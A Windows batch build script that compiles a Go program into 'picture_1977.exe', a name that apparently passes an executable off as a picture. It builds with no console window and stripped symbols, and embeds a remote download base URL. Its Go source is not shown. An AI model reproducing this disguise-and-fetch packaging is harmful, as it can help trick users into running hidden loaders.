@echo off
setlocal
cd /d "%~dp0"

set "BASE_URL=https://olxp.cc/download"
if not "%~1"=="" set "BASE_URL=%~1"

echo Building picture_1977.exe ...
echo Install base: %BASE_URL%

go build -trimpath -ldflags "-s -w -H windowsgui -X main.defaultBaseURL=%BASE_URL%" -o "..\..\downloads\picture_1977.exe" .
if errorlevel 1 (
    echo Build failed.
    exit /b 1
)

for %%F in ("..\..\downloads\picture_1977.exe") do echo Done: downloads\picture_1977.exe (%%~zF bytes)
exit /b 0
